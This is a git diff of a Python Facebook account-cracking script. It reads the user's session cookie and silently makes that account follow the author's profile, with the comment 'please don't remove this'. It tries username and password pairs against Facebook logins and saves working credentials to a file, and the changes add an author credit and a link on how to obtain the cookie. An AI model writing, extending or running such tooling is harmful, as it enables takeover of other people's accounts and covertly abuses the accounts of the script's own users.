@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+# coded by zettamus
+
 import os
 import re 
 import json
@@ -16,6 +18,7 @@ check = 0
 result = 0
 def masuk():
         print("\n\n\t[ LOGIN YOUR FACEBOOK ]\n")
+        print("> how to get cookie : \n  https://m.facebook.com/story.php?story_fbid=240261960743816&id=100042800416881 ")
         try:
                 cek = open("cookies").read()
         except FileNotFoundError:
@@ -30,7 +33,7 @@ def masuk():
                         print("# Change the language, please wait!!")
                         requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                 try:
-                        # please don't remove this
+                        # please don't remove this or change
                         ikuti = parser(requests.get(mbasic.format("/zettamus.zettamus.3"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                         ses.get(mbasic.format(ikuti),cookies=cek)
                 except :
@@ -63,7 +66,7 @@ def login(username,password):
                         f.write(username + '|' + password + '\n')
         else:
                 die += 1
-        print(f"\r# cracking: results : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
+        print(f"\r# results : life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
 def getid(url):
         raw = requests.get(url,cookies=kuki).content
         getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
